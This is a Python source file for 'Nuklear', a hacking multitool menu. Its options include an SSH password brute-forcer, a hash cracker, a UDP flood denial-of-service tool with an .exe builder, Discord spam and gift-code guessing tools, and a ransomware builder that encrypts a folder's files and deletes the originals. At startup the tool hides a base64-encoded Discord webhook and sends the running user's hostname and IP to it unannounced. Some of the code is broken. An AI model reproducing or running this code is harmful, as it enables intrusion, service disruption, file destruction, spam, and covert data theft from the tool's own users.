from colorama import Fore, Style
import os, platform, sys, socket, requests, time, random, string, discord, paramiko, cloudscraper, datetime, hashlib, base64
from discord.ext import commands
from pwn import *

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

class color:
    RED = Fore.RED + Style.BRIGHT
    WHITE = Fore.WHITE + Style.BRIGHT
    RESET = Fore.RESET + Style.RESET_ALL
    GREEN = Fore.GREEN + Style.BRIGHT

def error(text):
    print(color.WHITE + f'\n[$] Unexpected error in {color.RED}Nuklear{color.WHITE}: {text}')
    input(color.WHITE + '[$] Press ENTER to return the menu: ')
    main()

def reset_color():
    print(color.RESET)

def exit_program():
    clear()
    reset_color()
    sys.exit()

def ret():
    input(color.WHITE + f'\n[$] Press {color.RED}ENTER{color.WHITE} to return the menu: ')
    main()

def nitro_gen():
    try:
        choice = int(input(color.WHITE + f'\n[$] Enter the amount of codes to generate: '))
        print('\n')
        for i in range(choice):
            time.sleep(0.5)
            code = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=24))
            url = f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}'
            valid = requests.get(url)
            res = valid.json()
            if 'CÃ³digo de regalo desconocido' or '10038' in res.text:
                print(color.RED + f'[$] Invalid code generated: {color.WHITE}{url}')

            if (valid.status_code != 404) and (res['code'] != 10038):
                print(color.GREEN + f'[$] Valid nitro code generated: {color.WHITE}{url}')
                break

            else:
                pass
                
                
    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error in the request: ' + str(ex))
    ret()

def scraper():
    try:
        choice = input(color.WHITE + '\n[$] Enter the website to scrape: ')
        string = input(color.WHITE + '[$] Enter the string to search: ')
        scraper = cloudscraper.create_scraper()
        response = scraper.get(choice)
        print(color.GREEN + '\n[$] Website scraped successfully')
        if string in response.text:
            print(color.GREEN + '[$] String found: ' + color.WHITE + string)
        else:
            print(color.RED + '[$] String not found: ' + color.WHITE + string)
        print(color.WHITE + f'\n{response.text}')
    except KeyboardInterrupt:
        error('Keyboard Interrupt')
    except Exception as ex:
        error('Error gathering information: ' + str(ex))

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
system = platform.system()
arch = platform.architecture()[0]
res = requests.get('https://api.ipify.org/?format=json')
public = res.json()['ip']

def webhook_nuker():
    try:
        choice = input(color.WHITE + '\n[$] Enter the webhook URL: ')
        times = int(input(color.WHITE + '[&] Enter the time to send messages: '))
        delay = int(input(color.WHITE + '[$] Enter the delay (separation between messages): '))
        message = input(color.WHITE + '[$] Enter the message to send: ')
        for _ in range(times):
            requests.post(choice, json={'username': 'Nuklear Spammer', 'content': message})
            time.sleep(delay)
        print(color.WHITE + f'[&] Message {color.RED}sent')
    except KeyboardInterrupt:
        error('Keyboard Interrupt')
    except Exception as ex:
        error("Can't send spam: " + str(ex))
    ret()

def token_spammer():
    try:
        message = input(color.WHITE + '\n[$] Enter the message to send: ')
        token = input(color.WHITE + '[$] Enter the bot token: ')
        channel_id = int(input(color.WHITE + '[$] Enter the channel ID: '))
        times = int(input(color.WHITE + '[$] Enter the times to send the message: '))

        intents = discord.Intents.default()
        intents.message_content = True

        bot = commands.Bot(command_prefix='!', intents=intents)

        @bot.event
        async def on_ready():
            print(color.WHITE + f'\n[$] Bot connected as {color.RED}{bot.user}')
            if message:
                channel = bot.get_channel(channel_id)
                if channel:
                    for _ in range(times):
                        await channel.send(message)
                        print(color.WHITE + f'[$] Message sent to {color.RED}{channel.name}')
                else:
                    error('Channel not found')
            await bot.close()

        bot.run(token)

    except KeyboardInterrupt:
        error('Keyboard Interrupt')
    except Exception as ex:
        error('Error spamming: ' + str(ex))

def brute_ssh():
    try:
        host = input(color.WHITE + '\n[$] Enter the target host to attack: ')
        username = input(color.WHITE + '[$] Enter the username: ')
        wordlist = input(color.WHITE + '[$] Enter the wordlist filename: ')
        print('\n')
        attempts = 0
        with open(wordlist, 'r') as passwords_list:
            for password in passwords_list:
                password = password.strip('\n')
                try:
                    print(color.RED + f"[Attempts: {color.WHITE}{attempts}{color.RED}] Attempting password: '{password}'")
                    response = ssh(host=host, user=username, password=password, timeout=2)
                    if response.connected():
                        print(color.GREEN + f"[$] Valid password found: {password}")
                        response.close()
                        break
                    response.close()
                except paramiko.ssh_exception.AuthenticationException:
                    print(color.RED + f"[$] Invalid password: {password}")
                attempts += 1
    except KeyboardInterrupt:
        error('Keyboard Interrupt')
    except Exception as ex:
        error('Error attacking: ' + str(ex))

def hasher():
    try:
        print(color.RED + '\n[md5] - [sha1] - [sha224] - [sha256] - [sha384] - [sha512] - [sha3_224] - [sha3_256] - [sha3_384] - [sha3_512]')
        choice = input(color.WHITE + '\n[$] Enter the hashing method: ')

        options = {'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'sha3_224', 'sha3_256', 'sha3_384', 'sha3_512'}

        if choice not in options:
            error('Invalid hashing method')

        text = input(color.WHITE + '[$] Enter the text to hash: ')

        if choice == 'sha1':
            hashed = hashlib.sha1(text.encode()).hexdigest()
        elif choice == 'sha224':
            hashed = hashlib.sha224(text.encode()).hexdigest()
        elif choice == 'sha256':
            hashed = hashlib.sha256(text.encode()).hexdigest()
        elif choice == 'sha384':
            hashed = hashlib.sha384(text.encode()).hexdigest()
        elif choice == 'sha512':
            hashed = hashlib.sha512(text.encode()).hexdigest()
        elif choice == 'sha3_224':
            hashed = hashlib.sha3_224(text.encode()).hexdigest()
        elif choice == 'sha3_256':
            hashed = hashlib.sha3_256(text.encode()).hexdigest()
        elif choice == 'sha3_384':
            hashed = hashlib.sha3_384(text.encode()).hexdigest()
        elif choice == 'sha3_512':
            hashed = hashlib.sha3_512(text.encode()).hexdigest()
        elif choice == 'md5':
            hashed = hashlib.md5(text.encode()).hexdigest()

        print(color.GREEN + f'\n[$] Text hashed successfully: {hashed}')
    except KeyboardInterrupt:
        error('Keyboard Interrupt')
    except Exception as ex:
        error('Error hashing: ' + str(ex))
    ret()

def breaker():
    try:
        print(color.RED + '\n[md5] - [sha1] - [sha224] - [sha256] - [sha384] - [sha512] - [sha3_224] - [sha3_256] - [sha3_384] - [sha3_512]')
        hash_to_break = input(color.WHITE + '\n[$] Enter the hash to break: ')
        method = input(color.WHITE + '[$] Enter the hashing method used: ')
        wordlist = input(color.WHITE + '[$] Enter the wordlist filename: ')
        
        options = {'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'sha3_224', 'sha3_256', 'sha3_384', 'sha3_512'}

        if method not in options:
            error('Invalid hashing method')
        
        with open(wordlist, 'r') as words:
            for word in words:
                word = word.strip()
                if method == 'sha1':
                    hashed_word = hashlib.sha1(word.encode()).hexdigest()
                elif method == 'sha224':
                    hashed_word = hashlib.sha224(word.encode()).hexdigest()
                elif method == 'sha256':
                    hashed_word = hashlib.sha256(word.encode()).hexdigest()
                elif method == 'sha384':
                    hashed_word = hashlib.sha384(word.encode()).hexdigest()
                elif method == 'sha512':
                    hashed_word = hashlib.sha512(word.encode()).hexdigest()
                elif method == 'sha3_224':
                    hashed_word = hashlib.sha3_224(word.encode()).hexdigest()
                elif method == 'sha3_256':
                    hashed_word = hashlib.sha3_256(word.encode()).hexdigest()
                elif method == 'sha3_384':
                    hashed_word = hashlib.sha3_384(word.encode()).hexdigest()
                elif method == 'sha3_512':
                    hashed_word = hashlib.sha3_512(word.encode()).hexdigest()
                elif method == 'md5':
                    hashed_word = hashlib.md5(word.encode()).hexdigest()
                
                if hashed_word == hash_to_break:
                    print(color.GREEN + f'[$] Hash broken! The word is: {word}')
                    return
            print(color.RED + '[$] Could not break the hash with the provided wordlist')

    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error breaking hash: ' + str(ex))
    ret()

def attack(ip, port, byte_size):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(byte_size)
        date = datetime.datetime.now()
        print(f"{color.WHITE}\n[&] Attacking on: {color.RED}{ip}{color.WHITE} and port {color.RED}{port}{color.WHITE} at time {color.RED}{date}{color.WHITE}...\n")
        time.sleep(2.5)
        sent = 0
        while True:
            date = datetime.datetime.now()
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(color.RED + f"    | [ Sent Packet: {color.WHITE}{sent}{color.RED} through {color.WHITE}{ip}{color.RED}:{color.WHITE}{port}{color.RED} at time {color.WHITE}{date}{color.RED} ]")
            if port == 65534:
                port = 1
    except Exception as ex:
        error('Error attacking' + str(ex))
    except KeyboardInterrupt:
        print(color.WHITE + f'\n[$] Attack to {color.RED}{ip}{color.WHITE} stopped on port {color.RED}{port}{color.WHITE} at date {color.RED}{date}{color.WHITE}')

def dos():
    try:
        target = input(color.WHITE + '\n[$] Enter the target IP to DOS: ')
        port = int(input(color.WHITE + '[$] Enter the port to attack: '))
        byte_size = int(input(color.WHITE + '[$] Enter the byte size to send: '))
        attack(target, port, byte_size)
    except Exception as ex:
        error('Error attacking' + str(ex))
    ret()

def http():
    try:
        port = input(color.WHITE + '\n[$] Enter the port to start the server: ')
        bind = input(color.WHITE + '[$] Bind to a IP adress? [y]es or [n]o: ')

        if bind.lower() == 'n':
            print(color.WHITE + f'[$] Starting on {ip}:{port}')
            print(color.RED + '\n')
            os.system(f'python3 -m http.server {port}')

        else:
            adress = input(color.WHITE + '[$] Enter the IP adress to bind: ')
            print(color.WHITE + f'[$] Starting on {color.RED}{ip}{color.WHITE}:{color.RED}{port}{color.WHITE} and binded to {color.RED}{adress}')
            print(color.RED + '\n')
            os.system(f'python3 -m http.server {port} -b {adress}')

    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error starting server: ' + str(ex))
    ret()

def ftp():
    try:
        port = input(color.WHITE + '\n[$] Enter the port to start the server: ')
        print(color.RED + '\n')

        os.system(f'python3 -m pyftpdlib -p {port}')

    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error starting server: ' + str(ex))

    ret()

def dos_program():
    try:
        target = input(color.WHITE + '\n[$] Enter the target IP to DOS: ')
        port = int(input(color.WHITE + '[$] Enter the port to attack: '))
        size = int(input(color.WHITE + '[$] Enter the byte sizy of the packet: '))
        print(color.RED + '\n')
        text = f'''
import socket, datetime, os, sys, time, random

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def attack(ip, port, byte_size):
    try:
        clear()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(byte_size)
        date = datetime.datetime.now()
        print(f"Attacking...")
        time.sleep(2.5)
        sent = 0
        while True:
            date = datetime.datetime.now()
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"    | [ Sent Packet: " + sent + ']')
            if port == 65534:
                port = 1

    except Exception as ex:
        clear()
        sys.exit()

    except KeyboardInterrupt:
        clear()
        sys.exit()


attack('{target}', '{port}', '{size}')
'''
        with open('dos.py', 'w') as file:
            file.write(text)

        os.system('python3 -m PyInstaller --onefile dos.py')
        print(color.WHITE + '\n[$] .exe finished and compiled successfully')
        os.remove('dos.py')

    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error creating file: ' + str(ex))

    ret()


def user_token_spammer():
    try:
        pass    #! falta esto no olvidar ---------------------------------------------------------------

    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error sending token message: ' + str(ex))

    ret()


def about():
    try:
        print(color.WHITE + f'\n[$] Project created By {color.RED}j0k3r{color.WHITE} && {color.RED}MrSteve{color.WHITE}')
        print(color.WHITE + f'[$] Discord: {color.RED}j0k3r --> j0k3r_s3rv1c35{color.WHITE} && {color.RED}MrSteve --> mrsteve476{color.WHITE}')
        print(color.WHITE + f'[$] Web pages: {color.RED}j0k3r --> https://jokercommunity.github.io{color.WHITE} && {color.RED}MrSteve --> https://gaingalaxy.net{color.WHITE}')
        print(color.WHITE + f'[$] Instagram: {color.RED}https://instagram.com/dualcoders{color.WHITE}')

    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error printing data: ' + str(ex))

    ret()

def maintenances():
    try:
        res = requests.get('https://status.discord.com/api/v2/scheduled-maintenances/upcoming.json')
        if res.status_code == 200:
            data = res.json()
            print(color.WHITE + '\n[$] Maintenances data: ')
            print(color.RED + '\n')
            print(data)

        else:
            error('Status code no valid')

    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error fetching API: ' + str(ex))

    ret()

def apps():
    try:
        application_id = input(color.WHITE + '\n[$] Enter the application ID: ')
        url = f"https://discord.com/api/v9/applications/public?application_ids={application_id}"
        response = requests.get(url)

        if response.status_code == 200:
            data = response.json()
            print(color.RED + '\n')
            print(data)

        else:
            error('Status code no valid')


    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error fetching API: ' + str(ex))

    ret()

def marketing():
    try:
        url = "https://discord.com/api/v9/premium-marketing"
        response = requests.get(url)

        if response.status_code == 200:
            data = response.json()
            print(color.RED + '\n')
            print(data)

        else:
            error('Status code no valid')


    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error fetching API: ' + str(ex))

    ret()

def builder():
    try:
        path = input(color.WHITE + '\n[$] Enter the path of the folder to encrypt files: ')
        key = input(color.WHITE + '[$] Enter the secret key to encrypt: ')
        message = input(color.WHITE + '[$] Enter the message to display: ')

        print(color.RED)

        content = f'''
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import serialization
import os

def clear():
    if os.name == 'nt': os.system('cls')
    else: os.system('clear')

def generar_clave(contraseÃ±a):
    sal = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=sal,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(contraseÃ±a.encode()), sal

def encriptar_archivo(archivo_entrada, archivo_salida, contraseÃ±a):
    with open(archivo_entrada, 'rb') as f:
        datos = f.read()

    clave, sal = generar_clave(contraseÃ±a)

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    datos_pad = padder.update(datos) + padder.finalize()

    iv = os.urandom(16)

    cifrado = Cipher(algorithms.AES(clave), modes.CFB(iv), backend=default_backend())
    cifrador = cifrado.encryptor()

    datos_encriptados = cifrador.update(datos_pad) + cifrador.finalize()

    with open(archivo_salida, 'wb') as f:
        f.write(iv)
        f.write(sal)
        f.write(datos_encriptados)

    print(f'[' + archivo_entrada + '] Encrypted as --> ' + archivo_salida)

def desencriptar_archivo(archivo_entrada, archivo_salida, contraseÃ±a):
    with open(archivo_entrada, 'rb') as f:
        iv = f.read(16)
        sal = f.read(16)
        datos_encriptados = f.read()

    clave = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=sal,
        iterations=100000,
        backend=default_backend()
    ).derive(contraseÃ±a.encode())

    cifrado = Cipher(algorithms.AES(clave), modes.CFB(iv), backend=default_backend())
    descifrador = cifrado.decryptor()

    datos_desencriptados = descifrador.update(datos_encriptados) + descifrador.finalize()

    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    datos = unpadder.update(datos_desencriptados) + unpadder.finalize()

    with open(archivo_salida, 'wb') as f:
        f.write(datos)

    print(f'[' + archivo_entrada + '] Decrypted as --> ' + archivo_salida')

contador = 0

if __name__ == '__main__':
    clear()
    print('\n')
    contraseÃ±a = {key}

    os.chdir({path})
    for file in os.listdir():
        encriptar_archivo(file, f'encrypted_file_' + contador + '.enc', contraseÃ±a)
        os.remove(file)
        contador += 1

    clear()
    print({message})
'''
        with open('ransomware.py', 'w') as file:
            file.write(content) 

        os.system('python3 -m PyInstaller --onefile ransomware.py')
        os.remove('ransomware.py')

    except KeyboardInterrupt:
        error('Keyboard Interrupt')

    except Exception as ex:
        error('Error building')

    ret()


def main():
    clear()
    title = f'''
â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  [Working on {color.WHITE}{hostname}{color.RED}:{color.WHITE}{ip}{color.RED}]
â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— [System: {color.WHITE}{system}{color.RED}:{color.WHITE}{arch}{color.RED}]
â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• [Created by {color.WHITE}j0k3r{color.RED} and {color.WHITE}MrSteve{color.RED}]
â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— [Discord servers: {color.WHITE}.gg/5422Dfxtud{color.RED} && {color.WHITE}.gg/aC5uXkhg{color.RED}]
â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘ [Web pages: {color.WHITE}https://jokercommunity.github.io{color.RED} && {color.WHITE}https://gaingalaxy.net{color.RED}]
â•šâ•â•  â•šâ•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â• [Public IP address: {color.WHITE}{public}{color.RED}]
  [Token: {token}]
'''
    print(color.RED + title)

    options = '''
[00]: Exit the program                [09]: Start HTTP server     
[01]: Discord Nitro Generator         [10]: Start FTP server
[02]: Discord Webhook Nuker           [11]: Generate DOS attack script in .exe
[03]: Discord Bot Token Spammer       [12]: Discord User Token Spammer
[04]: Bruteforce SSH to a IP          [13]: About 
[05]: Website scraper                 [14]: Obtain info of Discord maintenances
[06]: Hasher for plain text to hash   [15]: Get info of public Discord application
[07]: Hash Breaker                    [16]: Get info of Discord premium marketing services
[08]: Dos attack                      [17]: Ransomware creator (no decrypt)
''' 
    print(color.WHITE + options)

    print(color.RED + f'\nâ”Œâ”€â”€ <{hostname}@{ip}> â”€ [~]')
    choice = input(color.RED + 'â””â”€â”€â•¼ $ ')

    if choice == '00': exit_program()
    elif choice == '01': nitro_gen()
    elif choice == '02': webhook_nuker()
    elif choice == '03': token_spammer()
    elif choice == '04': brute_ssh()
    elif choice == '05': scraper()
    elif choice == '06': hasher()
    elif choice == '07': breaker()
    elif choice == '08': dos()
    elif choice == '09': http()
    elif choice == '10': ftp()
    elif choice == '11': dos_program()
    elif choice == '12': user_token_spammer()
    elif choice == '13': about()
    elif choice == '14': maintenances()
    elif choice == '15': apps()
    elif choice == '16': marketing()
    elif choice == '17': builder()
    else: error('Invalid choice')


def gen_token():
    first = hashlib.md5(ip.encode()).hexdigest()
    bytes_data = hostname.encode('utf-8')
    base64_bytes = base64.b64encode(bytes_data)
    second = base64_bytes.decode('utf-8')
    global token
    token = first + ':' + second
    date = datetime.datetime.now()
    message = f'**New login with token: {token} --> at date {date}**'

    enc = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MTYzMzgxMjQ4ODY1MDc5Mi9uUDFYNmprSGJjelZVUmZJMjZkaG5VX2hhcHc3dnRFdWJvU1FlZDBHS050d2dUamI2Nl9faE03TmZlYzRoclpuSEtSVw=='
    mensaje_base64_bytes = enc.encode('utf-8')
    mensaje_decodificado_bytes = base64.b64decode(mensaje_base64_bytes)
    webhook = mensaje_decodificado_bytes.decode('utf-8')

    clear()
    print(color.WHITE + '[$] Your login token is: ' + color.RED + token)
    choice = input(color.WHITE + '[$] Login with your token: ')

    if choice == token:
        try:
            requests.post(webhook, json={'username': 'Nuklear', 'content': message})
            main()

        except Exception as ex:
            print(color.RED + '\n[$] Error starting Nuklear: ' + str(ex))

    else:
        exit()

gen_token()